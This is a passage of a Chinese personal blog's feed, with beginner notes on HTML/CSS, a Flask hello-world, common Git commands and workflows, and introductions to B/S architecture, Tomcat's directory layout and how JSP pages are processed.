title="前端基础"></a>前端基础</h2><p>前端开发涉及构建用户界面。以下是一个简单的HTML和CSS示例：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">&lt;!-- index.html --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;My Web Page&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"styles.css"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome to My Web Page&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;This <span class="keyword">is</span> a paragraph of text.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">css复制代码/* styles.css */</span><br><span class="line">body {</span><br><span class="line">    font-family: Arial, sans-serif;</span><br><span class="line">    background-color: <span class="comment">#f0f0f0;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">h1 {</span><br><span class="line">    color: <span class="comment">#333333;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">p {</span><br><span class="line">    color: <span class="comment">#666666;</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="后端基础"><a href="#后端基础" class="headerlink" title="后端基础"></a>后端基础</h2><p>后端开发处理服务器端的逻辑和数据。以下是一个使用Flask框架的简单示例：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello, World!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></tbody></table></figure><h2 id="在Web应用中连接和操作数据库"><a href="#在Web应用中连接和操作数据库" class="headerlink" title="在Web应用中连接和操作数据库"></a>在Web应用中连接和操作数据库</h2><p>在Web应用中连接和操作数据库与之前的示例类似，只是你需要结合前端和后端的知识来实现完整的功能。例如，你可以使用Flask与数据库进行交互，从前端收集用户输入，并将数据存储在数据库中。</p><p>这些学习步骤和示例将帮助你了解高级主题和模块，以及可能涉及的Web开发方向。根据你的兴趣和需求，逐步探索这些领域将带来更深入的理解和技能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git的基础使用</title>
      <link href="/NANABLOG/2023/11/18/Git/"/>
      <url>/NANABLOG/2023/11/18/Git/</url>
      
        <content type="html"><![CDATA[<p>以下是关于Git中几个区域及其作用的表格，包括暂存区、工作区、本地仓库和远程仓库：</p><table><thead><tr><th align="center">区域</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">暂存区（Stage/Index）</td><td align="center">用于暂存待提交的更改。通过<code>git add</code>命令将文件添加到暂存区，可以将其标记为待提交的更改。</td></tr><tr><td align="center">工作区（Working Directory）</td><td align="center">用户在本地计算机上实际看到的目录和文件。工作区是Git仓库的根目录，其中包含所有版本控制下的文件。</td></tr><tr><td align="center">本地仓库（Local Repository）</td><td align="center">存储在用户计算机上的实际Git仓库。它包含所有提交的历史记录、分支、标签等信息。</td></tr><tr><td align="center">远程仓库（Remote Repository）</td><td align="center">存储在远程服务器上的Git仓库。通常用于与他人共享代码或备份代码。可以通过<code>git push</code>命令将本地仓库的更改推送到远程仓库。</td></tr></tbody></table><p>这些区域在Git中扮演着不同的角色，它们协同工作以实现版本控制和协作。通过使用暂存区，用户可以临时保存多个版本的更改，并在准备好提交时将它们一起提交到本地仓库。工作区是用户实际看到和操作的文件和目录，而本地仓库则存储了整个Git仓库的历史记录和元数据。远程仓库用于与他人共享代码或备份代码，可以通过<code>git push</code>命令将本地仓库的更改推送到远程仓库。</p><ol><li><strong>工作区</strong>：从Git版本库解包出来的实际可编辑的文件，放在磁盘上供我们使用或修改，即我们能直接看到的项目目录。</li><li><strong>暂存区</strong>：是一个文件，实际位于.git/index，所以把暂存区也叫做索引（Index），保存了下次将要提交的文件列表信息。通过执行<code>git add</code>命令将工作区中的文件添加到暂存区。</li><li><strong>本地仓库</strong>：存储在用户计算机上的实际Git仓库，包含所有提交的历史记录、分支、标签等信息。执行<code>git commit</code>命令将暂存区的文件提交到本地仓库。</li><li><strong>远程仓库</strong>：存储在远程服务器上的Git仓库，通常用于与他人共享代码或备份代码。通过执行<code>git push</code>命令将本地仓库的更改推送到远程仓库。</li></ol><p>命令:</p><p>克隆 远程仓库 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span></span><br></pre></td></tr></tbody></table></figure><p>检查本地仓库状态 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></tbody></table></figure><p>将工作区的修改添加到暂存区 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git add  &lt;file&gt;</span><br></pre></td></tr></tbody></table></figure><p>将暂存区的修改提交到本地仓库 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git commit -m &lt;msg&gt;</span><br></pre></td></tr></tbody></table></figure><p>将本地仓库提交到远程仓库 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></tbody></table></figure><p>查看日志</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> </span><br></pre></td></tr></tbody></table></figure><p>tip:输入q退出</p><p>查看提交记录</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></tbody></table></figure><p>tip:使用此方式查看的文件Id比较短</p><p>编写：</p><p>在工作区撤销指定文件 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git checkout -- &lt;file&gt;</span><br></pre></td></tr></tbody></table></figure><p>从暂存区撤销到工作区 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git reset <span class="built_in">head</span> .  </span><br></pre></td></tr></tbody></table></figure><p>tip:当你已经将代码add 到暂存区的时候 你想要撤回先要将代码从暂存区撤销回工作区 才能使用checkout撤销文件做出修改</p><p>从本地仓库撤销已提交消息</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git reset --hard</span><br></pre></td></tr></tbody></table></figure><p>假设您有一个 Git 仓库，里面包含了一些提交记录，并且当前分支位于最新的提交上。现在，假设您误提交了一些代码并且想撤回这个提交。</p><p>您可以使用 <code>git log</code> 命令查看提交记录，找到您想要撤回的提交的哈希值或引用，然后运行 <code>git reset --hard &lt;commit-hash&gt;</code> 命令撤回提交。在这个例子中，假设您要撤回最后一个提交，可以使用 <code>git reset --hard HEAD~1</code> 命令。</p><p>这个命令的效果是将工作目录和索引恢复到上一个提交状态，并且丢弃所有在重置点之后进行的修改。任何未提交的更改都会被丢弃。</p><p>回到之前的版本</p><p>首先，使用 <code>git reflog</code> 命令可以查看提交历史记录以及每次操作对应的哈希值。这可以帮助你找到需要回退到的特定提交。接下来，你可以使用 <code>git revert --no-edit &lt;hash&gt;</code> 命令来撤销指定提交的更改，但不会打开编辑器以供编辑提交信息。</p><p>例如，假设要回退到哈希值为 <code>&lt;hash&gt;</code> 的提交，你可以执行以下命令：</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git revert --no-edit &lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>这将会创建一个新的提交，内容是撤销了哈希值为 <code>&lt;hash&gt;</code> 的提交所引入的更改。该命令不会打开编辑器以进行提交信息的修改，而是使用默认的撤销提交信息。</p><p>分支</p><table><thead><tr><th align="center">步骤</th><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><code>git init</code></td><td align="center">初始化一个Git仓库</td></tr><tr><td align="center">2</td><td align="center"><code>git branch</code></td><td align="center">查看当前分支列表</td></tr><tr><td align="center">3</td><td align="center"><code>git branch &lt;branch-name&gt;</code></td><td align="center">创建一个新的分支，名为<code>&lt;branch-name&gt;</code></td></tr><tr><td align="center">4</td><td align="center"><code>git checkout &lt;branch-name&gt;</code></td><td align="center">切换到新创建的分支，名为<code>&lt;branch-name&gt;</code></td></tr><tr><td align="center">5</td><td align="center"><code>git merge &lt;branch-name&gt;</code></td><td align="center">将当前分支与指定的<code>&lt;branch-name&gt;</code>分支合并</td></tr><tr><td align="center">6</td><td align="center"><code>git branch -d &lt;branch-name&gt;</code></td><td align="center">删除名为<code>&lt;branch-name&gt;</code>的分支（如果合并后的分支已被删除）</td></tr><tr><td align="center">7</td><td align="center"><code>git branch -D &lt;branch-name&gt;</code></td><td align="center">强制删除名为<code>&lt;branch-name&gt;</code>的分支（即使合并未完成）</td></tr><tr><td align="center">8</td><td align="center"><code>git push origin &lt;branch-name&gt;</code></td><td align="center">将名为<code>&lt;branch-name&gt;</code>的分支推送到远程仓库（如果已关联）</td></tr></tbody></table><p>创建本地仓库和远程仓库然后链接仓库进行操作</p><p>使用 </p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git remote add &lt;name&gt; &lt;url&gt;</span><br></pre></td></tr></tbody></table></figure><p>关联远程仓库</p><p>强制拉取远程仓库的数据</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git pull --allow-unrelated-histories</span><br></pre></td></tr></tbody></table></figure><p>如果在强制拉取的时候报错则需要输入当前远程仓库名字和分支</p><p>然后将本地仓库内容推送到远程仓库</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line"></span><br><span class="line">git commit -m &lt;msg&gt; </span><br><span class="line"><span class="comment">#origin 是你链接远程仓库时设置的名称 master是你要推送的分支</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></tbody></table></figure><p>tip:如果报错</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">$ git push</span><br><span class="line">fatal: The current branch master has no upstream branch.</span><br><span class="line">To push the current branch and <span class="built_in">set</span> the remote as upstream, use</span><br><span class="line"></span><br><span class="line">    git push --set-upstream origin master</span><br><span class="line"></span><br><span class="line">To have this happen automatically <span class="keyword">for</span> branches without a tracking</span><br><span class="line">upstream, see <span class="string">'push.autoSetupRemote'</span> <span class="keyword">in</span> <span class="string">'git help config'</span>.</span><br></pre></td></tr></tbody></table></figure><p>则是因为你没有设置你要推送的远程仓库名称和分支</p><p>分支:</p><p>不同的分支都是独立的，合并分支后才会统一，适合多线程操作</p><p>创建分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git branch &lt;分支名称&gt; master</span><br></pre></td></tr></tbody></table></figure><p>推送分支到远程仓库</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git push - u origin &lt;分支名称&gt;</span><br></pre></td></tr></tbody></table></figure><p>创建一个新分支到远程仓库</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git push origin &lt;new branch name&gt;</span><br></pre></td></tr></tbody></table></figure><p>删除远程仓库的分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git push origin --delete &lt;old-branch-name&gt;</span><br></pre></td></tr></tbody></table></figure><p>删除本地分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git branch -d &lt;branch-name&gt;</span><br></pre></td></tr></tbody></table></figure><p>查看分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></tbody></table></figure><p>查看所有分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></tbody></table></figure><p>tip:如果你创建了但是没有显示分支，那么就切换你创建的分支再回到主分支就出现了</p><p>切换分支</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git checkout &lt;分支名称&gt;</span><br></pre></td></tr></tbody></table></figure><p>合并分支</p><p>git merge master</p><p>如果想要将其他分支的内容合并到master那么按照以下流程操作</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git checkout master </span><br><span class="line"></span><br><span class="line">git merge frr </span><br><span class="line"></span><br><span class="line">git push origin master</span><br></pre></td></tr></tbody></table></figure><p>或者直接</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></tbody></table></figure><p>分支改名</p><figure class="highlight sh"><table><tbody><tr><td class="code"><pre><span class="line">git branch -m &lt;旧名字&gt; &lt;新名字&gt;</span><br></pre></td></tr></tbody></table></figure><h1 id="git"><a href="#git" class="headerlink" title="git"></a>git</h1><h4 id="一-作用"><a href="#一-作用" class="headerlink" title="一.作用"></a>一.作用</h4><p>分布式版本控制工具,主要管理java源代码,xml文件,html页面,可以通过它进行 代码回溯,版本切换,多人协作,远程备份</p><h4 id="二-git常用命令"><a href="#二-git常用命令" class="headerlink" title="二.git常用命令"></a>二.git常用命令</h4><ol><li><p>全局设置</p><p>当安装Git后首先要做的事情是设置用户名称和email地址。这是非常重要的，因为每次Git提交都会使用该用户信息。<br>在Git命令行中执行下面命令:<br>◆设置用户信息</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git config --global user.name "zyw"</span><br><span class="line">git config --global user.email "1024655706@qq.com"</span><br></pre></td></tr></tbody></table></figure><p>◆查看配置信息</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></tbody></table></figure><p>注意:上面设置的user.name和user.email并不是我们在注册码云账号时使用的用户名和邮箱，此处可以任意设置。</p></li><li><p>获取git仓库</p><ol><li>在本地初始化仓库 git init(不常用)</li><li>拉去远程仓库(常用)</li></ol></li><li><p>git基本概念</p><ol><li>版本库 git文件包含配置信息,日志信息,文件信息.</li><li>工作区包含git文件的目录存放开发代码<ul><li>untracked未跟踪(未被纳入版本控制) 创建完文件没有执行git add *</li><li>tracked已跟踪(被纳入版本控制)<ol><li>unmodified 未修改状态</li><li>Modified 已修改状态</li><li>staged 已暂存状态</li></ol></li></ul></li><li>暂存区.git目录中的index文件也叫stage</li></ol></li><li><p>本地仓库操作命令</p><ol><li><p>git status 查看文件状态</p></li><li><p>git add 将文件存入暂存区</p></li><li><p>git reset 将暂存区的文件取消 或者切换到指定版本 git rest –hard</p></li><li><p>git commit 将暂存区的文件提交到 版本库      </p><p>ps:处理完冲突后提交报错  后面跟 -i</p></li><li><p>git log 查看日志</p></li></ol></li><li><p>远程仓库操作命令</p><ol><li><p>git remote -v 查看远程仓库</p></li><li><p>git remote add   origin 添加远程仓库 将本地仓库和远程仓库进行关联</p><p>ps: git pull origin master</p><p>ps:关联后拉取远程仓库信息会报错,在拉取的后面添加–allow-unrelated-histories</p></li><li><p>git clone 从远程仓库克隆</p></li><li><p>git pull 从远程仓库拉取</p></li><li><p>git push 推送远程仓库</p></li></ol></li><li><p>分支操作命令</p><ol><li>git branch 查看分支 -r 远程分支  -a 远程分支和本地分支</li><li>git branch [name] 创建分支</li><li>git checkout [name] 切换分支</li><li>git push [shortName] [name] 推送至远程仓库分支</li><li>git merge [name] 合并分支</li></ol></li><li><p>标签操作命令(版本)</p><ol><li><p>git tag 查看标签</p></li><li><p>git tag [name] 创建标签</p></li><li><p>git push [shortName] [name] 推送至远程仓库</p></li><li><p>git checkout -b [branch] [name] 检出标签</p></li></ol></li></ol><h4 id="三-在idea中使用git"><a href="#三-在idea中使用git" class="headerlink" title="三.在idea中使用git"></a>三.在idea中使用git</h4><ol><li><p>初始化仓库</p><ol><li>本地初始化仓库 去cvs中</li><li>克隆远程仓库 去cvs中</li></ol></li><li><p>按照图形化界面提交代码即可</p></li><li><p>如果是本地初始化仓库需要拉取 代码在进行提交</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Push rejected</span><br><span class="line">推拒</span><br><span class="line">Push to origin/master was rejected</span><br><span class="line">推到原点/主人被拒绝</span><br><span class="line">git pull origin master -–allow-unrelated-histories</span><br><span class="line">git push -u origin master -f</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web学习笔记</title>
      <link href="/NANABLOG/2023/10/13/Web/"/>
      <url>/NANABLOG/2023/10/13/Web/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>Web应用程序是一种基于互联网的软件应用程序，它通过浏览器来提供服务和功能。用户可以使用Web应用程序在互联网上执行各种任务，如购物、社交、学习、工作等。这些应用程序通常使用Web技术（例如HTML、CSS、JavaScript等）来构建，并在Web服务器上运行。</p></blockquote><p><strong>Web应用程序的运行逻辑：</strong></p><ol><li><strong>用户发出请求：</strong> 用户在浏览器中输入Web应用程序的网址（URL）或者通过点击链接、按钮等与Web应用程序进行交互。这些请求通常是HTTP请求。</li><li><strong>Web服务器接收请求：</strong> 用户的请求到达Web服务器，服务器收到请求后开始处理。</li><li><strong>应用程序逻辑处理：</strong> Web服务器将请求传递给Web应用程序，应用程序进行逻辑处理。这可能包括从数据库中获取数据、处理用户输入、生成动态内容等。</li><li><strong>生成响应：</strong> 应用程序根据请求处理的结果生成一个HTTP响应。这个响应包含了要在用户浏览器上显示的内容，通常是HTML、CSS、JavaScript和其他资源。</li><li><strong>发送响应：</strong> 生成的HTTP响应发送回到用户的浏览器。</li><li><strong>浏览器渲染：</strong> 用户的浏览器接收到响应后，开始解析和渲染HTML、CSS和JavaScript，将内容显示在用户的屏幕上。</li><li><strong>用户与应用程序交互：</strong> 用户可以在浏览器中与Web应用程序的页面进行交互，例如填写表单、点击按钮、触发事件等。</li><li><strong>再次请求：</strong> 如果用户在应用程序上执行了操作，可能会产生新的请求，重复上述步骤。</li></ol><p><strong>网络顺序：</strong></p><p>Web应用程序的运行涉及多个设备和网络层级，按照一般顺序为：</p><ol><li><strong>客户端（Client）：</strong> 用户使用的设备，如计算机、手机、平板电脑等，装有浏览器用于访问Web应用程序。</li><li><strong>本地网络：</strong> 用户的设备连接到本地网络，如家庭Wi-Fi或公司局域网。</li><li><strong>互联网：</strong> 本地网络通过互联网连接到Web服务器，互联网是连接全球网络的基础设施。</li><li><strong>Web服务器：</strong> 接收并处理用户请求的服务器，运行Web应用程序。</li><li><strong>应用程序服务器：</strong> 对于复杂的Web应用程序，可能涉及应用程序服务器来处理业务逻辑。</li><li><strong>数据库服务器：</strong> Web应用程序通常需要从数据库中获取或存储数据，数据库服务器用于管理和存储数据。</li></ol><p>在这个网络顺序中，数据和请求通过互联网在不同的服务器之间传递，直到最终在用户的浏览器上显示出来。Web应用程序的运行涉及多个环节的协调与交互，这样的设计使得Web应用程序具有高度的可扩展性和灵活性。</p></blockquote><p><strong>目录</strong></p><p>[TOC]</p><h1 id="1-架构"><a href="#1-架构" class="headerlink" title="1.架构"></a>1.架构</h1><h2 id="B-S架构"><a href="#B-S架构" class="headerlink" title="B/S架构"></a>B/S架构</h2><p>当谈到BS架构（Browser-Server架构）的Web应用程序时，我们可以用一个简单的比喻来帮助新手理解。想象一下您正在参加一场虚拟咖啡馆会议：</p><ol><li><strong>浏览器（Browser）：</strong> 就像您自己坐在电脑前的浏览器，它是您与Web应用程序交互的窗口。您可以在浏览器中输入网址、点击链接或按钮，就像在虚拟咖啡馆会议中发言、举手或参与讨论一样。</li><li><strong>服务器（Server）：</strong> 咖啡馆的服务员就像服务器，他们接收您的需求并提供所需的服务。在BS架构中，服务器是一个强大的计算机，它储存了Web应用程序的所有信息和逻辑。当您在浏览器中发出请求时，服务器会处理您的请求并提供相应的内容，就像服务员会为您提供咖啡、点心和其他所需的东西一样。</li><li><strong>交互过程：</strong> 当您在浏览器中输入网址并按下回车时，这就像您走进咖啡馆并坐下。您告诉服务员您的需求，服务员将您的请求带到厨房（服务器处理请求），然后返回您所需的咖啡和点心（服务器响应请求）。您通过浏览器看到的内容，就像您在桌子上看到的咖啡和点心一样。</li><li><strong>分离性：</strong> 就像在虚拟咖啡馆会议中，您不需要亲自去厨房，只需与服务员交互，BS架构将前端（浏览器）和后端（服务器）分开。这种分离性使得开发人员可以独立地设计、构建和维护这两部分，从而使整个系统更加有序和灵活。</li></ol><p>总的来说，BS架构的Web应用程序就像您在虚拟咖啡馆与服务员进行交互一样。您使用浏览器发送请求，服务器处理并返回响应，这种分离性和交互方式使得Web应用程序变得高效、灵活且易于维护。</p><h2 id="C-S架构"><a href="#C-S架构" class="headerlink" title="C/S架构"></a>C/S架构</h2><h1 id="2-Tomcat"><a href="#2-Tomcat" class="headerlink" title="2.Tomcat"></a>2.Tomcat</h1><p>当谈到Tomcat时，它是一个非常流行的Java Servlet容器和JavaServer Pages（JSP）容器，它允许您在Web服务器上运行Java Web应用程序。以下是Tomcat的一些主要特点，以便新手更容易理解：</p><p><strong>1. 什么是Servlet和JSP：</strong></p><ul><li>Servlet是Java编写的服务器端程序，用于处理客户端请求并生成动态内容。</li><li>JSP是JavaServer Pages的缩写，它是一种将Java代码嵌入HTML页面的技术，用于生成动态Web内容。</li></ul><p><strong>2. Tomcat是什么：</strong></p><ul><li>Tomcat是Apache软件基金会的一个开源项目，它是一个Servlet容器，也称为Web容器。它的主要作用是运行Servlet和JSP，将这些动态内容转换成HTML并发送给客户端浏览器。</li></ul><p><strong>3. 轻量级：</strong></p><ul><li>Tomcat是一个相对轻量级的Web服务器，适合用于小到中等规模的应用程序。</li></ul><p><strong>4. 独立性：</strong></p><ul><li>Tomcat是一个独立的Web服务器，您可以将其与其他Web服务器（如Apache HTTP Server）结合使用，或者将其作为独立的Web服务器运行。</li></ul><p><strong>5. 容易配置：</strong></p><ul><li>Tomcat具有简单且易于理解的配置。大多数情况下，您只需对默认配置进行少量修改即可开始运行Web应用程序。</li></ul><p><strong>6. 内置开发支持：</strong></p><ul><li>Tomcat内置了一个方便的开发模式，它允许您在不重启服务器的情况下进行应用程序的修改和调试。</li></ul><p><strong>7. 易于部署：</strong></p><ul><li>将Java Web应用程序部署到Tomcat中通常很简单。只需将您的WAR（Web ARchive）文件放在指定的目录中，Tomcat将自动将其解压并启动您的应用程序。</li></ul><p><strong>8. 支持多个协议：</strong></p><ul><li>Tomcat支持HTTP和HTTPS协议，并可以通过配置支持其他协议，如AJP（Apache JServ Protocol）。</li></ul><p><strong>9. 健壮性：</strong></p><ul><li>Tomcat在运行Java Web应用程序时表现良好，并且对于处理并发请求和大量用户非常可靠。</li></ul><p>总之，Tomcat是Java Web开发的重要组成部分，它为Java开发人员提供了一个快速、可靠且易于使用的平台，用于构建和运行动态的Java Web应用程序。对于新手来说，了解Tomcat的这些基本特点将有助于更好地理解它在Java Web开发中的作用和价值。</p><h2 id="Tomcat目录"><a href="#Tomcat目录" class="headerlink" title="Tomcat目录"></a>Tomcat目录</h2><p>当您使用Tomcat作为您的Java Web应用程序的服务器时，了解Tomcat的目录结构对于新手是非常重要的。这里我会简要介绍Tomcat的主要目录，以帮助您更容易理解：</p><ol><li><strong>bin目录：</strong><ul><li>这个目录包含了可执行文件，如启动和停止Tomcat服务器的脚本。在Windows系统中，您会找到<code>startup.bat</code>用于启动Tomcat，<code>shutdown.bat</code>用于停止Tomcat。在类Unix系统中，对应的文件分别是<code>startup.sh</code>和<code>shutdown.sh</code>。</li></ul></li><li><strong>conf目录：</strong><ul><li>这个目录包含了Tomcat的配置文件。其中最重要的文件是<code>server.xml</code>，它定义了Tomcat服务器的配置信息，如端口号、虚拟主机设置等。此外，还有其他一些配置文件，如<code>web.xml</code>用于配置Web应用程序的设置，<code>tomcat-users.xml</code>用于定义Tomcat管理员的登录信息等。</li></ul></li><li><strong>lib目录：</strong><ul><li>该目录包含Tomcat服务器运行所需的Java类库（JAR文件）。这些类库是Tomcat运行的核心组件，包括Servlet和JSP的实现以及其他支持文件。</li></ul></li><li><strong>logs目录：</strong><ul><li>Tomcat在运行时会将各种日志文件保存在这个目录中。这些日志文件包含了服务器的访问日志、错误日志和其他重要的运行时信息，对于故障排查和性能监测非常有用。</li></ul></li><li><strong>webapps目录：</strong><ul><li>这个目录是您放置Web应用程序的地方。每个放在这个目录下的文件夹都会被Tomcat当作一个独立的Web应用程序来部署和运行。例如，如果您的应用程序是<code>myapp.war</code>，将其放在<code>webapps</code>目录下，Tomcat将自动将其解压并启动您的应用程序。</li></ul></li><li><strong>work目录：</strong><ul><li>Tomcat在运行时将生成临时文件和缓存文件，并将它们存储在这个目录中。这些临时文件通常是编译后的Servlet类文件和JSP文件，以及其他缓存数据。</li></ul></li><li><strong>temp目录：</strong><ul><li>临时文件目录。Tomcat在运行时会在这个目录中创建临时文件，并在不再需要时自动删除。</li></ul></li><li><strong>logs目录：</strong><ul><li>Tomcat的日志目录。Tomcat会将服务器运行过程中的日志信息保存在这个目录中，包括访问日志、错误日志等。</li></ul></li></ol><p>请注意，Tomcat的目录结构可能会因版本而异，但通常以上述目录为基础。了解Tomcat的目录结构有助于您更好地管理和理解Tomcat服务器以及您的Java Web应用程序的部署和运行。</p><h1 id="3-JSP"><a href="#3-JSP" class="headerlink" title="3.JSP"></a>3.JSP</h1><h2 id="JSP介绍"><a href="#JSP介绍" class="headerlink" title="JSP介绍"></a>JSP介绍</h2><p>当谈到JSP（JavaServer Pages），可以将其想象成一种用于在Web应用程序中创建动态内容的技术。JSP允许您在HTML页面中嵌入Java代码，以便在服务器端生成动态内容，然后将其发送到用户的浏览器。</p><p><strong>JSP的主要特点和工作原理：</strong></p><ol><li><strong>动态内容生成：</strong> JSP允许您将Java代码嵌入到HTML中，从而能够在服务器上动态生成内容。这意味着您可以根据用户请求、数据库数据或其他条件来生成不同的页面内容。</li><li><strong>易于学习：</strong> 对于熟悉HTML和Java的开发人员来说，学习JSP相对容易。您只需要在HTML中插入少量的Java代码，就可以在页面中实现复杂的逻辑和功能。</li><li><strong>与Servlet结合：</strong> JSP实际上是基于Servlet技术的，它被转化为Java Servlet并在服务器端运行。这使得JSP可以与Java类、库和框架无缝结合，实现更强大的功能。</li><li><strong>分离逻辑和视图：</strong> JSP鼓励将Java代码和HTML内容分开，这有助于更好地组织代码，使代码更易于维护和理解。</li><li><strong>标签库：</strong> JSP标签库（Tag Library）提供了许多预定义的标签，用于执行常见的任务，如循环、条件语句等。这些标签可以简化页面开发过程。</li><li><strong>隐式对象：</strong> JSP提供了一组隐式对象，可以直接在JSP页面中使用，如请求对象、响应对象、会话对象等，以便更方便地访问和操作Web应用程序的不同方面。</li></ol><p><strong>JSP的工作流程：</strong></p><ol><li><strong>客户端发出请求：</strong> 用户在浏览器中输入URL或点击链接，向Web服务器发出请求。</li><li><strong>Web服务器接收请求：</strong> Web服务器接收到请求，将其传递给处理JSP的Servlet引擎。</li><li><strong>JSP转化为Servlet：</strong> JSP文件被Servlet引擎编译成一个Java Servlet。这个Servlet包含了JSP页面中的Java代码和动态内容生成逻辑。</li><li><strong>生成动态内容：</strong> 编译后的Servlet执行JSP页面中的Java代码，生成动态内容。这可能涉及从数据库获取数据、处理用户输入等。</li><li><strong>生成响应：</strong> Servlet生成一个包含动态内容的HTTP响应，然后将其发送回给Web服务器。</li><li><strong>Web服务器发送响应：</strong> Web服务器将生成的响应发送回用户的浏览器。</li><li><strong>浏览器渲染：</strong> 浏览器接收响应，解析HTML和动态内容，然后在用户的屏幕上渲染出完整的页面。</li></ol><p>总之，JSP是一种强大的技术，允许开发人员在HTML中嵌入Java代码，以便在服务器上生成动态内容。这使得Web应用程序可以根据用户的需求和其他条件提供个性化和实时的体验。</p><h2 id="JSP工作原理"><a href="#JSP工作原理" class="headerlink" title="JSP工作原理"></a>JSP工作原理</h2><p> JSP（JavaServer Pages）的工作原理涉及到以下几个主要步骤：</p><ol><li><strong>JSP文件创建和部署：</strong> 开发人员编写JSP文件，这些文件包含HTML标记和嵌入在其中的Java代码片段。JSP文件必须部署到Web服务器中，通常与其他Web资源（例如HTML、CSS、JavaScript、Servlet等）一起组成Web应用程序。</li><li><strong>JSP的编译：</strong> 当Web服务器启动时或者第一次请求JSP页面时，JSP引擎（容器）将对JSP文件进行编译。编译将JSP文件转换为一个Java Servlet。该Servlet类会继承自javax.servlet.jsp.HttpJspBase，并包含在JSP页面中嵌入的Java代码。</li><li><strong>Servlet的初始化：</strong> 当Servlet被编译后，容器将创建该Servlet的一个实例，并调用其init()方法，进行一些初始化设置。</li><li><strong>HTTP请求处理：</strong> 当用户在浏览器中请求JSP页面时，Web服务器将创建一个HTTP请求对象，并将其传递给JSP Servlet实例。</li><li><strong>JSP代码执行：</strong> Servlet实例处理HTTP请求，执行JSP页面中嵌入的Java代码。这些Java代码可能包含条件语句、循环、数据库查询等。在执行过程中，Servlet可以访问一系列隐式对象（如request、response、session等），用于处理客户端发送的请求和生成响应。</li><li><strong>动态内容生成：</strong> 在JSP代码的执行过程中，Servlet可以根据请求、数据库数据或其他条件来生成动态内容。生成的内容通常是在HTML标记中嵌入的，用于构建最终要发送到浏览器的响应。</li><li><strong>HTTP响应生成：</strong> Servlet执行完JSP页面中的Java代码后，它将生成一个HTTP响应，其中包含了动态生成的内容。</li><li><strong>HTTP响应发送：</strong> Servlet将生成的HTTP响应发送回Web服务器。</li><li><strong>浏览器渲染：</strong> 